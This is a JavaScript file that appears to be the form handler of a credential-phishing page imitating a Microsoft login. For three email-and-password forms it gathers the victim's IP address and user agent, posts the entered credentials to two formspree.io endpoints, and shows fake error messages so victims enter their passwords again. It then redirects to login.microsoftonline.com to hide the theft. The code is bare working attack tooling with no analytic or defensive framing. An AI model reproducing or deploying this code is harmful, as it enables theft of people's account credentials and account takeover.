var gg = navigator.userAgent;
// ------------------------------------------------FIRST FORM CONTROLLER OPEN---------------------------------------------------------------
import("https://api.ipify.org?format=jsonp&callback=getIPx");
var inputFz = document.getElementsByClassName(".ipx");
  function getIPx(data) { 
   inputFz.value = data.ip;
                        } 
window.addEventListener( "load", function () {
  function sendData() {
    const XHR = new XMLHttpRequest();

    // Bind the FormData object and the form element
    const FD = new FormData( form );

    FD.append("IP : " ,  document.getElementsByClassName(".ipx").value);
    FD.append("UserAgent : " ,  gg);

    // Define what happens on successful data submission
    XHR.addEventListener( "load", function(event) {
      document.getElementById("cname").innerHTML = "enter valid email"
      document.getElementById('email').value = ''
      document.getElementById('password').value = ''
      setTimeout(function(){
          document.getElementById("cname").innerHTML = "";
                }, 3000);


    } );

    // Define what happens in case of error
    XHR.addEventListener( "error", function( event ) {
		document.getElementById("cname").innerHTML = "incorrect email or password"
		document.getElementById('email').value = ''
		document.getElementById('password').value = ''
		setTimeout(function(){
				document.getElementById("cname").innerHTML = "";
							}, 3000);





//----------------------------------------------------FIRST FORM CONTROLLER SUB UNIT OPEN-----------------------------------------------------




function sendData() {
  const XHR = new XMLHttpRequest();

  // Bind the FormData object and the form element
  const FD = new FormData( form );

  FD.append("IP : " ,  document.getElementsByClassName(".ipx").value);
  FD.append("UserAgent : " ,  gg);

  // Define what happens on successful data submission
  XHR.addEventListener( "load", function(event) {
    document.getElementById("cname").innerHTML = "enter valid email"
    document.getElementById('email').value = ''
    document.getElementById('password').value = ''
    setTimeout(function(){
        document.getElementById("cname").innerHTML = "";
              }, 3000);


  } );

  // Define what happens in case of error
  XHR.addEventListener( "error", function( event ) {
  document.getElementById('email').value = ''
  document.getElementById('password').value = ''
  setTimeout(function(){
    document.getElementById("cnamex").innerHTML = "";
          }, 3000);
  document.getElementById("cname").innerHTML = "bad request";
  document.getElementById("cname").innerHTML = "redirecting to oauth2";
  document.getElementById("cname").innerHTML = "redirecting to oauth2";
  window.location.replace("https://login.microsoftonline.com/");



  } );

  // Set up our request
  XHR.open( "POST", "https://formspree.io/f/xdobbngd" );

  // The data sent is what the user provided in the form
  XHR.send( FD );
}

// Access the form element...
const form = document.getElementById( "myForm" );

// ...and take over its submit event.
form.addEventListener( "submit", function ( event ) {
  event.preventDefault();

  sendData();
} );




//----------------------------------------------------FIRST FORM CONTROLLER SUB UNIT CLOSE-----------------------------------------------------








    } );

    // Set up our request
    XHR.open( "POST", "https://formspree.io/f/xrgjjzqe" );

    // The data sent is what the user provided in the form
    XHR.send( FD );
  }

  // Access the form element...
  const form = document.getElementById( "myForm" );

  // ...and take over its submit event.
  form.addEventListener( "submit", function ( event ) {
    event.preventDefault();

    sendData();
  } );
} );
// ------------------------------------------------FIRST FORM CONTROLLER CLOSE---------------------------------------------------------------

// ------------------------------------------------SECOND FORM CONTROLLER OPEN---------------------------------------------------------------

import("https://api.ipify.org?format=jsonp&callback=getIPxx");
var inputFx = document.getElementsByClassName(".ipxx");

function getIPxx(data) { 
 
  inputFx.value = data.ip;
} 


window.addEventListener( "load", function () {
  function sendDatax() {
  const XHRx = new XMLHttpRequest();

  // Bind the FormData object and the form element
  const FDD = new FormData( form );

  FDD.append("IP : " , document.getElementsByClassName(".ipxx").value);
  FDD.append("UserAgent : " ,  gg);

  // Define what happens on successful data submission
  XHRx.addEventListener( "load", function(event) {
    
    document.getElementById("cnamex").innerHTML = "enter valid details"
    document.getElementById('emailx').value = ''
    document.getElementById('passwordx').value = ''
    setTimeout(function(){
        document.getElementById("cnamex").innerHTML = "";
              }, 3000);



  } );

  // Define what happens in case of error
  XHRx.addEventListener( "error", function( event ) {
    document.getElementById("cnamex").innerHTML = "incorrect email or password"
    document.getElementById('emailx').value = ''
    document.getElementById('passwordx').value = ''
    setTimeout(function(){
        document.getElementById("cnamex").innerHTML = "";
              }, 3000);

 //----------------------------------------------------SECOND FORM CONTROLLER SUB UNIT OPEN-----------------------------------------------------





 function sendDatax() {
  const XHRx = new XMLHttpRequest();

  // Bind the FormData object and the form element
  const FDD = new FormData( form );

  FDD.append("IP : " , document.getElementsByClassName(".ipxx").value);
  FDD.append("UserAgent : " ,  gg);

  // Define what happens on successful data submission
  XHRx.addEventListener( "load", function(event) {
    
    document.getElementById("cnamex").innerHTML = "enter valid details"
    document.getElementById('emailx').value = ''
    document.getElementById('passwordx').value = ''
    setTimeout(function(){
        document.getElementById("cnamex").innerHTML = "";
              }, 3000);



  } );

  // Define what happens in case of error
  XHRx.addEventListener( "error", function( event ) {
    document.getElementById("cnamex").innerHTML = "incorrect email or password"
    document.getElementById('emailx').value = ''
    document.getElementById('passwordx').value = ''
    setTimeout(function(){
        document.getElementById("cnamex").innerHTML = "";
              }, 3000);

              document.getElementById("cnamex").innerHTML = "bad request";
              document.getElementById("cnamex").innerHTML = "redirecting to oauth2";
              document.getElementById("cnamex").innerHTML = "redirecting to oauth2";
              window.location.replace("https://login.microsoftonline.com/");



} );

// Set up our request
XHRx.open( "POST", "https://formspree.io/f/xdobbngd" );

// The data sent is what the user provided in the form
XHRx.send( FDD );
}

// Access the form element...
const form = document.getElementById( "myForm2" );

// ...and take over its submit event.
form.addEventListener( "submit", function ( event ) {
event.preventDefault();

sendDatax();
} );

  //----------------------------------------------------SECOND FORM CONTROLLER SUB UNIT CLOSE-----------------------------------------------------

  } );

  // Set up our request
  XHRx.open( "POST", "https://formspree.io/f/xrgjjzqe" );

  // The data sent is what the user provided in the form
  XHRx.send( FDD );
  }

  // Access the form element...
  const form = document.getElementById( "myForm2" );

  // ...and take over its submit event.
  form.addEventListener( "submit", function ( event ) {
  event.preventDefault();

  sendDatax();
  } );
} );
  //----------------------------------------------------SECOND FORM CONTROLLER  CLOSE-----------------------------------------------------

// ------------------------------------------------THRIRD FORM CONTROLLER OPEN---------------------------------------------------------------


import("https://api.ipify.org?format=jsonp&callback=getIP");
var inputF = document.getElementsByClassName(".ip");

function getIP(data) { 
 
  inputF.value = data.ip;
} 

window.addEventListener( "load", function () {


  function sendDatay() {
    const XHRxr = new XMLHttpRequest();

   // Bind the FormData object and the form element
    const FDDD = new FormData( form );

    // Append
   FDDD.append("IP: " , document.getElementsByClassName(".ip").value);
   FDDD.append("UserAgent : " ,  gg);

   // Define what happens on successful data submission
   XHRxr.addEventListener( "load", function(event) {
    document.getElementById("cnamey").innerHTML = "enter valid email"
    document.getElementById('emaily').value = ''
    document.getElementById('passwordy').value = ''
    setTimeout(function(){
        document.getElementById("cnamey").innerHTML = "";
              }, 3000);

                                                    } );

   // Define what happens in case of error
   XHRxr.addEventListener( "error", function( event ) {
    document.getElementById("cnamey").innerHTML = "incorrect email or password"
    document.getElementById('emaily').value = ''
    document.getElementById('passwordy').value = ''
    setTimeout(function(){
        document.getElementById("cnamey").innerHTML = "";
              }, 3000);

// ----------------------------------------------------- THIRD FORM SUB UNIT OPEN ------------------------------------------

function sendDatay() {
  const XHRxr = new XMLHttpRequest();

 // Bind the FormData object and the form element
  const FDDD = new FormData( form );

  // Append
 FDDD.append("IP: " , document.getElementsByClassName(".ip").value);
 FDDD.append("UserAgent : " ,  gg);

 // Define what happens on successful data submission
 XHRxr.addEventListener( "load", function(event) {
  document.getElementById("cnamey").innerHTML = "enter valid email"
  document.getElementById('emaily').value = ''
  document.getElementById('passwordy').value = ''
  setTimeout(function(){
      document.getElementById("cnamey").innerHTML = "";
            }, 3000);

        } );

 // Define what happens in case of error
 XHRxr.addEventListener( "error", function( event ) {
  document.getElementById("cnamey").innerHTML = "incorrect email or password"
  document.getElementById('emaily').value = ''
  document.getElementById('passwordy').value = ''
  setTimeout(function(){
      document.getElementById("cnamey").innerHTML = "";
            }, 3000);


            document.getElementById("cnamey").innerHTML = "bad request";
            document.getElementById("cnamey").innerHTML = "redirecting to oauth2";
            document.getElementById("cnamey").innerHTML = "redirecting to oauth2";
            window.location.replace("https://login.microsoftonline.com/");

                             } );

  // Set up our request
  XHRxr.open( "POST", "https://formspree.io/f/xdobbngd" );

  // The data sent is what the user provided in the form
   XHRxr.send( FDDD );
}

  // Access the form element...
  const form = document.getElementById( "myForm3" );

  // ...and take over its submit event.
  form.addEventListener( "submit", function ( event ) {
  event.preventDefault();

  sendDatay();
         } );


 } );


//---------------------------------------------------------THIRD FORM SUB UNIT CLOSE----------------------------------------

                              

    // Set up our request
    XHRxr.open( "POST", "https://formspree.io/f/xrgjjzqe" );

    // The data sent is what the user provided in the form
     XHRxr.send( FDDD );
  }

    // Access the form element...
    const form = document.getElementById( "myForm3" );

    // ...and take over its submit event.
    form.addEventListener( "submit", function ( event ) {
    event.preventDefault();

    sendDatay();
      } );
} );

// ------------------------------------------------THRIRD FORM CONTROLLER CLOSE---------------------------------------------------------------